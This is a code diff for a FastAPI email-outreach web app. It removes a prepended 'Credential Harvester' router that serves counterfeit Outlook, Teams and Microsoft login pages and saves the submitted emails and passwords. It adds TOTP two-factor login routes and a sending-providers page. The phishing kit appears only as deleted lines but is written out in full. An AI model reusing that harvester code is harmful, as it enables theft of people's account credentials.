@@ -1,357 +1,3 @@
-# Add this import at the top of app.py if not already present, or ensure link_harvester is in bb folder
-
-# --- ADD THIS ROUTER BLOCK TO YOUR bb/app.py ---
-
-from fastapi import APIRouter, Request, Form
-from fastapi.responses import HTMLResponse, RedirectResponse, Response
-from fastapi.templating import Jinja2Templates
-
-phish_router = APIRouter(prefix="/phish", tags=["Credential Harvester"])
-templates = Jinja2Templates(directory="bb/templates")
-
-# High-Fidelity CSS Configurations for M365
-BRAND_STYLES = {
-   "outlook": """
-    <style>
-    body { margin: 0; font-family: 'Segoe UI', 'Outlook', sans-serif; background-color: #dadce0; height: 100vh; display: flex; }
-   .sidebar { width: 70px; background: #202020; flex-direction: column; align-items: center; padding-top: 20px; }
-   .item-func { width: 40px; height: 40px; border-radius: 8px; margin-bottom: 15px; color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; }
-   .item-func.inbox { background: #0078d4; }
-   .item-func.done { background: #323130; }
-   .main-view { flex: 1; background: white; display: flex; flex-direction: column; }
-   .top-nav { height: 48px; background: #f3f2f1; display: flex; align-items: center; padding: 0 20px; border-bottom: 1px solid #eaeaea; }
-   .mail-list { flex: 1; overflow-y: auto; }
-   .mail-item { display: flex; padding: 10px 20px; border-bottom: 1px solid #f3f2f1; }
-   .mail-item:hover { background: #f9f9f9; }
-   .avatar-sm { width: 32px; height: 32px; background: #0078d4; color: white; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 14px; margin-right: 12px; font-weight: 600;}
-   .content-text h4 { margin: 0; font-size: 14px; }.content-text p { margin: 4px 0 0 0; color: #605e5c; font-size: 12px; }
-    </style>
-    """,
-   "teams": """
-    <style>
-    body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #333; color: white; height: 100vh; }
-   .chat-sidebar { width: 260px; background: #202020; flex-direction: column; padding: 10px; height: 100%; }
-   .call-sidebar { width: 300px; background: white; color: #333; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-   .header { font-size: 24px; font-weight: 300; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #444; }
-   .chat-btn { display: flex; align-items: center; padding: 10px; color: #ccc; width: 100%; height: 40px; background: #333; border-radius: 4px; margin-bottom: 5px; }
-   .chat-btn:hover { background: #444; color: white; }
-   .mfa-card { background: white; padding: 20px; border-radius: 8px; text-align: center; color: #333; width: 100%; margin-top: auto; }
-    </style>
-    """,
-   "login": """
-    <style>
-    body { display: flex; justify-content: center; align-items: center; height: 100vh; background: #f3f2f1; font-family: 'Segoe UI', sans-serif; margin: 0; }
-   .login-box { width: 400px; text-align: center; background: white; padding: 40px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
-   .logo { height: 40px; margin-bottom: 30px; filter: grayscale(100%); }
-   .input-group { margin-bottom: 15px; text-align: left; }
-   .input-field { width: 100%; padding: 10px; border: 1px solid #e1dfdd; }
-   .btn-primary { background: #0078d4; color: white; border: none; width: 100%; padding: 12px; font-size: 16px; font-weight: 600; margin-top: 10px; cursor: pointer; }
-    </style>
-   """
-}
-
-@phish_router.get("/dashboard", response_class=HTMLResponse)
-async def dashboard(request: Request):
-    return templates.TemplateResponse("dashboard_phish.html", {"request": request})
-
-@phish_router.get("/view/{brand}", response_class=HTMLResponse)
-async def view_brand(request: Request, brand: str):
-    html_style = BRAND_STYLES.get(brand, "<style>body{background:#ddd;}h1{color:#333;}</style>")
-  
-    if brand == "outlook":
-        content = f"""
-    <div style="height:100%">{html_style}
-    <div class="sidebar">
-    <div class="item-func inbox">📥</div>
-    <div class="item-func done">✅</div>
-    </div>
-    <div class="main-view">
-    <div class="top-nav">Inbox - User Account</div>
-    <div class="mail-list">
-    <div class="mail-item">
-    <div class="avatar-sm">EX</div>
-    <div class="content-text"><h4>Security Info Update Required</h4><p>from security@outlook.com</p></div>
-    </div>
-    <div class="mail-item">
-    <div class="avatar-sm">JM</div>
-    <div class="content-text"><h4>Quarterly Planning</h4><p>from John Doe</p></div>
-    </div>
-    </div>
-    <form name="login_form" action="/phish/capture?brand=outlook" method="POST">
-    <input type="hidden" name="email" id="email" placeholder="Email">
-    <input type="hidden" name="password" id="password" placeholder="Password">
-    </form>
-    </div>
-   """
-  
-    elif brand == "teams":
-        content = f"""
-    <div style="height:100%">{html_style}
-    <div class="chat-sidebar">
-    <div class="chat-btn">💬 General</div>
-    <div class="chat-btn">📅 My Calendar</div>
-    <div class="header">Engineering</div>
-    <div class="chat-btn">📁 Shared Files</div>
-    </div>
-    <div class="chat-sidebar" style="width: 260px;">
-    <div class="header">New Config</div>
-    </div>
-    <div class="call-sidebar">
-    <div class="mfa-card">
-    <h3>Teams Sign In</h3>
-    <p>We've noticed a sign-in attempt.</p>
-    <form onsubmit="event.preventDefault(); document.getElementById('email').value='victim@gmail.com'; document.getElementById('password').value='password123'; document.login_form.submit()">
-    <input class="input-field" type="text" placeholder="Phone number or email">
-    <button class="btn-primary">Sign In</button>
-    </form>
-    </div>
-    </div>
-   """
-  
-    else:
-        content = f"""
-    <h1 style="font-family:sans-serif; padding:20px; color:#333;">{brand} Page</h1>
-    <form action="/phish/capture?brand={brand}" method="POST">
-    <input type="text" name="email" id="email" placeholder="Email">
-    <input type="password" name="password" id="password">
-    <button class="btn-primary">Submit</button>
-    </form>
-   """
-  
-    return HTMLResponse(content=content)
-
-@phish_router.post("/capture")
-async def capture(request: Request):
-    form_data = await request.form()
-    email = form_data.get("email", "N/A")
-    password = form_data.get("password", "N/A")
-    brand = form_data.get("brand", "Unknown")
-  
-    # Use the manager to save real data
-    # Need to reference your WB class here or instantiate one
-    # Assuming get_workspace is available from workspaces.py
-    ws = get_workspace(request.session.get("user_email"))
-    # We'll save to the user's workspace
-    save_creds(email, password, brand, ws)
-  
-    return RedirectResponse(url="/dashboard", status_code=303)
-
-# CLI COMMAND TO PROVIDE INSTRUCTIONS
-# python bb/link_harvester.py --init-db
-
-"""The web app: FastAPI + server-rendered pages.
-
-Auth is a session cookie; accounts are created by an admin. Every page a
-user sees is scoped to their own workspace (their Harvey home), so one
-install serves many people without any of Harvey's code knowing.
-"""
-
-import asyncio
-import contextvars
-import os
-import logging
-import secrets
-import time
-from contextlib import asynccontextmanager
-from pathlib import Path
-from urllib.parse import quote, urlparse
-
-from fastapi import Depends, FastAPI, File, Form, HTTPException, Request, UploadFile
-from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, RedirectResponse
-from fastapi.templating import Jinja2Templates
-from pydantic import ValidationError
-
-from bb import deliverability
-from bb import gmail_oauth, microsoft_oauth, recipients as recipients_mod
-from bb.linkcheck import check_public_url
-from bb.mail_autoconfig import guess_settings
-from bb.mail_paste import parse_pasted_login, to_smtp_fields
-from bb.accounts import Accounts, LoginThrottle
-from bb.settings import Settings
-from harvey.listclean import EMAIL_RE
-from bb.workspaces import (_template_variants_from_form, ASKS, ATTACH_POLICIES, COMMON_TIMEZONES, GOALS, GREETINGS, LLM_PRESETS,
-                           MAX_INBOX_LINKS, MAX_SECTOR_MESSAGES, MAX_TEMPLATE_VARIANTS, MAX_TEST_SEND, OUTREACH_MODES, MAX_SECTOR_NEEDS,
-                           SECTOR_LABELS, SPEEDS, TEMPLATE_VARIANTS,
-                           STYLES, TONES, Workspace, _sector_messages_from_form, _sector_needs_from_form,
-                           all_workspaces)
-
-logger = logging.getLogger("bb.app")
-
-SESSION_COOKIE = "bb_session"
-GMAIL_NONCE_COOKIE = "bb_gmail_nonce"
-MS_NONCE_COOKIE = "bb_ms_nonce"
-TEMPLATES_DIR = Path(__file__).parent / "templates"
-
-
-def _redirect(url: str, msg: str = "", error: str = "") -> RedirectResponse:
-    params = []
-    if msg:
-        params.append("msg=" + quote(msg))
-    if error:
-        params.append("error=" + quote(error))
-    if params:
-        url += ("&" if "?" in url else "?") + "&".join(params)
-    return RedirectResponse(url, status_code=303)
-
-
-async def check_anthropic_key(key: str, workspace_id: str = "") -> tuple[bool, str]:
-    """Is this the user's working Anthropic key? Listing models costs
-    nothing and fails fast on a bad key. ``workspace_id`` is only needed for
-    a key that is not scoped to a workspace (sk-ant-usr-…)."""
-    import anthropic
-
-    from harvey.brain import anthropic_headers
-
-    if not key.startswith("sk-ant-"):
-        return False, "Anthropic keys start with sk-ant-. Copy the whole key from console.anthropic.com."
-    if key.startswith("sk-ant-oat"):
-        return False, ("That is a Claude.ai sign-in token, not an API key. API keys start with "
-                       "sk-ant-api and come from console.anthropic.com → API keys.")
-
-    def said(e) -> str:
-        body = getattr(e, "body", None)
-        if isinstance(body, dict):
-            err = body.get("error")
-            if isinstance(err, dict) and err.get("message"):
-                return str(err["message"])
-        return str(getattr(e, "message", "") or e)[:200]
-
-    try:
-        client = anthropic.AsyncAnthropic(api_key=key, max_retries=0, timeout=20,
-                                          default_headers=anthropic_headers(workspace_id))
-        await client.models.list(limit=1)
-    except anthropic.AuthenticationError:
-        return False, "Anthropic rejected that key."
-    except anthropic.PermissionDeniedError:
-        return False, "That key is not allowed to use the API (check its permissions in the Console)."
-    except anthropic.BadRequestError as e:
-        message = said(e)
-        if "workspace" in message.lower():
-            return False, ("This key is not tied to a workspace, so Anthropic needs the workspace ID with it. "
-                           "Paste the ID from console.anthropic.com → Settings → Workspaces into the "
-                           "Workspace ID box below, or create the key inside a workspace "
-                           "(API keys → Create key → pick a workspace) and paste that key instead.")
-        if "credit" in message.lower() or "billing" in message.lower():
-            return False, ("The key is valid, but the Anthropic account has no credit, so every call "
-                           "would fail. Add prepaid credit at console.anthropic.com → Settings → "
-                           "Billing (a few dollars goes a long way), or choose Google Gemini or Groq "
-                           "above, which have free tiers.")
-        return False, f"Anthropic refused the request: {message}"
-    except anthropic.RateLimitError:
-        return True, "Key accepted (Anthropic is rate-limiting it right now; the worker waits and retries)."
-    except anthropic.APIStatusError as e:
-        return False, f"Anthropic answered {e.status_code}: {said(e)}"
-    except Exception as e:  # network, proxy, outage
-        return False, f"Could not reach Anthropic to check the key: {type(e).__name__}: {str(e)[:120]}"
-    return True, "Key accepted."
-
-
-async def check_openai_compatible(base_url: str, api_key: str, model: str) -> tuple[bool, str]:
-    """Does this endpoint answer with this key? Listing models is free on
-    every OpenAI-compatible API; the model name is checked against the list
-    when the list is readable, and only warned about otherwise."""
-    import httpx
-
-    base_url = (base_url or "").strip().rstrip("/")
-    if not base_url.startswith(("http://", "https://")):
-        return False, "The API address must start with https:// (or http:// for a local server)."
-    headers = {"Authorization": f"Bearer {api_key}"} if api_key else {}
-    try:
-        async with httpx.AsyncClient(timeout=20) as client:
-            resp = await client.get(f"{base_url}/models", headers=headers)
-    except httpx.HTTPError as e:
-        return False, f"Could not reach {base_url}: {type(e).__name__}."
-    if resp.status_code in (401, 403):
-        return False, "That provider rejected the key."
-    if resp.status_code >= 400:
-        return False, f"{base_url} answered {resp.status_code}: {resp.text[:160]}"
-    def bare(name: str) -> str:
-        # Gemini lists "models/gemini-2.5-flash"; requests take either form.
-        name = str(name or "")
-        return name[len("models/"):] if name.startswith("models/") else name
-
-    try:
-        ids = {bare(m.get("id")) for m in (resp.json().get("data") or []) if isinstance(m, dict)}
-        ids.discard("")
-    except ValueError:
-        ids = set()
-    if ids and model and bare(model) not in ids:
-        shown = sorted(i for i in ids if not any(w in i for w in ("embedding", "image", "audio", "tts", "vision")))
-        return False, (f"Connected, but the model '{model}' is not in this provider's list. "
-                       "Pick one of: " + ", ".join(shown[:14]) + ("…" if len(shown) > 14 else ""))
-    return True, "Connected."
-
-
-async def test_m365(settings_dict: dict) -> tuple[bool, str]:
-    """Sign in as the Azure app and read the mailbox, exactly as the worker will."""
-    from types import SimpleNamespace
-
-    from harvey.integrations.microsoft import MicrosoftAppProvider
-
-    env = SimpleNamespace(m365_tenant_id=settings_dict["m365_tenant_id"], m365_client_id=settings_dict["m365_client_id"],
-                          m365_client_secret=settings_dict["m365_client_secret"],
-                          m365_mailbox=settings_dict["m365_mailbox"],
-                          m365_reply_to=settings_dict.get("m365_reply_to", ""))
-    try:
-        return await MicrosoftAppProvider(None, env).test_connection()
-    except Exception as e:
-        return False, f"Connection failed: {e}"
-
-
-async def check_domain(domain: str) -> dict:
-    return await deliverability.check_domain(domain)
-
-
-async def test_smtp(smtp: dict) -> tuple[bool, str]:
-    """Log in to the mailbox's SMTP and IMAP servers with the given settings,
-    exactly as the worker will."""
-    from types import SimpleNamespace
-
-    from harvey.integrations.smtp_mail import SmtpImapProvider
-
-    env = SimpleNamespace(
-        smtp_host=smtp["smtp_host"], smtp_port=int(smtp["smtp_port"] or 587),
-        smtp_username=smtp["smtp_username"], smtp_password=smtp["smtp_password"],
-        imap_host=smtp["imap_host"] or smtp["smtp_host"], imap_port=int(smtp["imap_port"] or 993),
-        imap_username=smtp["imap_username"] or smtp["smtp_username"],
-        imap_password=smtp["imap_password"] or smtp["smtp_password"],
-    )
-    try:
-        return await SmtpImapProvider(None, env).test_connection()
-    except Exception as e:
-        return False, f"Connection failed: {e}"
-
-
-def linked_text(text: str):
-    """A message as text with its links clickable: [words](address) shows
-    the words, a bare address shows itself; everything else escaped."""
-    import html as _html
-
-    from markupsafe import Markup
-
-    from harvey.integrations.mail_provider import MD_LINK_RE, _INLINE_URL_RE, _href, _split_url
-    text = text or ""
-    out, pos = [], 0
-    spans = []
-    for m in MD_LINK_RE.finditer(text):
-        spans.append((m.start(), m.end(), m.group(1), m.group(2)))
-    for m in _INLINE_URL_RE.finditer(text):
-        if any(a <= m.start() < b for a, b, _, _ in spans):
-            continue
-        url, tail = _split_url(m.group(1))
-        if url:
-            spans.append((m.start(), m.start() + len(url), url, url))
-    for start, end, words, url in sorted(spans):
-        if start < pos:
-            continue
-        out.append(_html.escape(text[pos:start]))
-        out.append(f'<a href="{_html.escape(_href(url), quote=True)}" target="_blank" rel="noopener noreferrer">{_html.escape(words)}</a>')
-        pos = end
-    out.append(_html.escape(text[pos:]))
-    return Markup("".join(out))
-
-
-
 """The web app: FastAPI + server-rendered pages.
 
 Auth is a session cookie; accounts are created by an admin. Every page a
@@ -793,9 +439,67 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             throttle.record(key)
             return await render(request, "login.html", error="Wrong email or password.")
         throttle.reset(key)
+        if accounts.totp_enabled(user["id"]):
+            response = _redirect("/login/totp")
+            response.set_cookie("bb_mfa_pending", accounts.new_mfa_challenge(user["id"]), max_age=300,
+                                httponly=True, samesite="lax", secure=settings.secure_cookies, path="/login")
+            return response
         token = accounts.create_session(user["id"], settings.session_days * 86400)
         response = _redirect("/")
         set_session_cookie(response, token)
+        return response
+
+    @app.get("/login/totp", response_class=HTMLResponse)
+    async def login_totp(request: Request):
+        if not request.cookies.get("bb_mfa_pending"):
+            return _redirect("/login", error="Your verification session expired. Sign in again.")
+        return await render(request, "login_totp.html")
+
+    @app.post("/login/totp")
+    async def login_totp_verify(request: Request, code: str = Form("")):
+        key = "totp:" + (request.client.host if request.client else "unknown")
+        if not throttle.allow(key):
+            return await render(request, "login_totp.html", error="Too many attempts. Wait before trying again.")
+        user = accounts.complete_mfa_challenge(request.cookies.get("bb_mfa_pending", ""), settings.secret_key(), code)
+        if not user:
+            throttle.record(key)
+            return await render(request, "login_totp.html", error="Incorrect or expired authenticator code.")
+        throttle.reset(key)
+        response = _redirect("/")
+        set_session_cookie(response, accounts.create_session(user["id"], settings.session_days * 86400))
+        response.delete_cookie("bb_mfa_pending", path="/login")
+        return response
+
+    @app.get("/security/mfa", response_class=HTMLResponse)
+    async def security_mfa(request: Request, user: dict = Depends(current_user)):
+        from bb import totp
+
+        enabled = accounts.totp_enabled(user["id"])
+        secret = "" if enabled else accounts.totp_secret(user["id"], settings.secret_key(), confirmed_only=False)
+        if not enabled and not secret:
+            try:
+                secret = accounts.begin_totp_enrollment(user["id"], settings.secret_key())
+            except ValueError:
+                enabled = True
+        response = await render(request, "mfa_setup.html", user, mfa_enabled=enabled,
+                                mfa_secret=secret, mfa_uri=totp.provisioning_uri(user["email"], secret) if secret else "")
+        response.headers["Cache-Control"] = "no-store"
+        return response
+
+    @app.post("/security/mfa/confirm")
+    async def security_mfa_confirm(user: dict = Depends(current_user), code: str = Form("")):
+        if not accounts.confirm_totp(user["id"], settings.secret_key(), code):
+            return _redirect("/security/mfa", error="The authenticator code did not match.")
+        response = _redirect("/security/mfa", msg="Authenticator verification enabled.")
+        set_session_cookie(response, accounts.create_session(user["id"], settings.session_days * 86400))
+        return response
+
+    @app.post("/security/mfa/disable")
+    async def security_mfa_disable(user: dict = Depends(current_user), code: str = Form("")):
+        if not accounts.disable_totp(user["id"], settings.secret_key(), code):
+            return _redirect("/security/mfa", error="Incorrect authenticator code.")
+        response = _redirect("/login", msg="Authenticator verification disabled. Sign in again.")
+        response.delete_cookie(SESSION_COOKIE, path="/")
         return response
 
     @app.post("/logout")
@@ -1081,6 +785,29 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         await ws.stop_mail_worker()
         ws.clear_llm()
         return _redirect("/apikey", msg="AI provider removed. Every campaign's worker and the background mail worker were stopped.")
+
+    @app.get("/sending-providers", response_class=HTMLResponse)
+    async def sending_providers_page(request: Request, user: dict = Depends(current_user)):
+        """Authenticated, read-only inventory of supported sender connections."""
+        ws = workspace_for(user)
+        provider = ws.mail_provider()
+        labels = {"gmail": "Gmail", "microsoft": "Microsoft", "microsoft_app": "Microsoft 365 app",
+                  "smtp": "SMTP / IMAP"}
+        mailboxes = []
+        if ws.mail_db_path.exists():
+            db = ws.mail_db()
+            await db.init()
+            mailboxes = await db.mailboxes(include_disabled=False)
+        return await render(
+            request, "sending_providers.html", user,
+            active_label=labels.get(provider, "No provider selected"),
+            connected=ws.mailbox_connected(),
+            sending=ws.sending_address(),
+            gmail_connected=ws.gmail_connected(),
+            microsoft_connected=ws.microsoft_connected() or ws.m365_configured(),
+            smtp_connected=ws.smtp_configured(),
+            studio_providers={m["provider"] for m in mailboxes if m["status"] == "ok"},
+        )
 
     # ── mailbox: Gmail (OAuth) or the mailbox's own SMTP/IMAP ──
 
